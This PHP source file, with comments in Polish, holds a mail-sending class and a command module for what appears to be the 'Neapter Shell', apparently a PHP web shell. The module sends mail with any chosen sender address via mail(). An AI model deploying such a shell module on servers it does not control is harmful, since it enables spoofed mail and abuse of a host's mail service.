<?php

/**
 * Neapter Framework
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2010-2011, Krzysztof Otręba
 *
 * @link      http://neapter.com
 * @license   http://neapter.com/license
 */

/**
 * Mail - Wyjatki
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    Neapter
 * @subpackage Lib\Exception
 *
 * @uses       Exception
 */
class MailException extends Exception
{
}

/**
 * Wysylanie emaila
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    Neapter
 * @subpackage Lib
 *
 * @uses       Neapter\Lib\Exception\MailException
 */
class Mail
{
    /**
     * Odbiorca
     *
     * @access protected
     * @var    string|array
     */
    protected $mTo;

    /**
     * Temat wiadomosci
     *
     * @access protected
     * @var    string
     */
    protected $sSubject;

    /**
     * Wiadomosc
     *
     * @access protected
     * @var    string
     */
    protected $sMessage;

    /**
     * Nadawca
     *
     * @access protected
     * @var    string
     */
    protected $sFrom;

    /**
     * Typ wiadomosci
     *
     * @access protected
     * @var    string
     */
    protected $sType = 'plain';

    /**
     * Naglowki
     *
     * @access protected
     * @var    array
     */
    protected $aHeaders = array();

    /**
     * Nadawca
     *
     * @uses   Neapter\Lib\Exception\MailException
     *
     * @access public
     * @param  string|array $mValue Nadawca
     * @return Mail                 Obiekt Mail
     */
    public function setTo($mValue)
    {
        if (is_string($mValue) && !filter_var($mValue, FILTER_VALIDATE_EMAIL)) {
            throw new MailException('Niepoprawny adres odbiorcy');
        } /**
         * Tablica adresow
         */
        else if (is_array($mValue)) {
            foreach ($mValue as $sEmail) {
                if (!filter_var($sEmail, FILTER_VALIDATE_EMAIL)) {
                    throw new MailException('Niepoprawny adres odbiorcy');
                }
            }
        }

        $this->mTo = $mValue;

        return $this;
    }

    /**
     * Temat wiadomosci
     *
     * @access public
     * @param  string $sValue Temat wiadomosci
     * @return Mail           Obiekt Mail
     */
    public function setSubject($sValue)
    {
        $this->sSubject = $sValue;

        return $this;
    }

    /**
     * Tresc wiadomosci
     *
     * @access public
     * @param  string $sValue Tresc wiadomosci
     * @return Mail           Obiekt Mail
     */
    public function setMessage($sValue)
    {
        $this->sMessage = $sValue;

        return $this;
    }

    /**
     * Nadawca
     *
     * @uses   Neapter\Lib\Exception\MailException
     *
     * @access public
     * @param  string $sValue Nadawca
     * @return Mail           Obiekt Mail
     */
    public function setFrom($sValue)
    {
        if (!filter_var($sValue, FILTER_VALIDATE_EMAIL)) {
            throw new MailException('Niepoprawny adres nadawcy');
        }

        $this->sFrom = $sValue;

        return $this;
    }

    /**
     * Typ wiadomosci
     *
     * @access public
     * @param  string $sValue Typ wiadomosci plain / html
     * @return Mail           Obiekt Mail
     */
    public function setType($sValue)
    {
        if ($sValue === 'html') {
            $this->sType = 'html';
        }

        return $this;
    }

    /**
     * Wysylanie emaila
     *
     * @uses   Neapter\Lib\Exception\MailException
     *
     * @access public
     * @return boolean TRUE jezeli email zostal wyslany
     */
    public function send()
    {
        /**
         * Odbiorca jest wymagany
         */
        if ($this->mTo === NULL) {
            throw new MailException('Odbiorca jest wymagany');
        }

        /**
         * Temat jest wymagana
         */
        if ($this->sSubject === NULL) {
            throw new MailException('Temat jest wymagany');
        }

        /**
         * Tresc jest wymagana
         */
        if ($this->sMessage === NULL) {
            throw new MailException('Treść wiadomości jest wymagana');
        }

        /**
         * Temat wiadomosci
         */
        $this->sSubject = '=?UTF-8?B?' . base64_encode($this->sSubject) . "?=";

        /**
         * Naglowki
         */
        $this->aHeaders = array
        (
            'Content-Type: text/' . $this->sType . '; charset=UTF-8',
            'From: ' . $this->sFrom,
            'Mime-Version: 1.0',
            'Content-Transfer-Encoding: 8bit'
        );

        /**
         * Wysylanie do wielu
         */
        if (is_array($this->mTo)) {
            $sTo = array_shift($this->mTo);

            $this->aHeaders[] = 'Bcc: ' . implode(', ', $this->mTo);

            $this->mTo = $sTo;

        }

        ini_set('mail.add_x_header', FALSE);

        /**
         * Wysylanie wiadomosci
         */
        return @ mail($this->mTo, $this->sSubject, $this->sMessage, implode("\r\n", $this->aHeaders));
    }

}

/**
 * =================================================================================================
 */

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Wysylanie wiadonosci za pomoca funkcji mail()
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleMail extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array
        (
            'mail',
            'email',
            'sendmail'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.00 2011-09-10 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wysyłanie emaili za pomocą natywnej funkcji mail()

	Użycie:
		mail nadawca odbiorca temat wiadomość
		mail nadawca odbiorca,odbiorca2 temat wiadomość

	Przykład:
		mail from@x.pl to@x.pl "Test wiadomości" "To jest wiadomość"
		mail from@x.pl to@x.pl,to2@x.pl "Test wiadomości" "To jest wiadomość"
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oShell->iArgc !== 4) {
            return self::getHelp();
        }

        try {
            /**
             * Ustawianie atrybutow dla wiadomosci
             */
            $oMail = new Mail();
            $oMail
                ->setFrom($this->oShell->aArgv[0])
                ->setTo(preg_split('~[,;]~', $this->oShell->aArgv[1]))
                ->setSubject($this->oShell->aArgv[2])
                ->setMessage($this->oShell->aArgv[3]);

            return sprintf('Wiadomość %szostała wysłana', ($oMail->send() ? NULL : 'nie '));

        } catch (MailException $oException) {
            return sprintf("Wystąpił następujący problem:\r\n\t%s", $oException->getMessage());
        }
    }

}
